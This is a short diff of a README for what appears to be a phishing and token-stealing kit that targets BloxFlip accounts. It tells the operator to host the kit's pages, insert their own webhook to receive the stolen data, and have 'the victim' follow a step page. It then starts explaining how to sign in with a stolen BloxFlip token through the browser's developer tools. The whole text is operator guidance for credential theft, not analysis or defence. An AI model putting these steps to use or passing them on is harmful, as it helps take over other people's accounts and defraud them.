@@ -8,7 +8,7 @@ Steps: You need a site hosting service, if you are new I recommend 000webhost.
 1. Once you have hosting, go to your file manager, upload the files then go to line 27 inside of /toppy/index.html and replace the webhook in there with yours
 2. after that, you need to go to /bloxflipstepone/index.html and change the website on line 354 to your website.
 
-Once you do that, you are finished.
+Once you do that, tell the victim to do what is listed on /bloxflipstepone, then you are finished.
 
 HOW TO LOGIN WITH BLOXFLIP TOKEN 
 Sign out of your current BF account. Inspect Element on bloxflip.com, go to applications ( if it does not show applications click the 3 arrows ) 
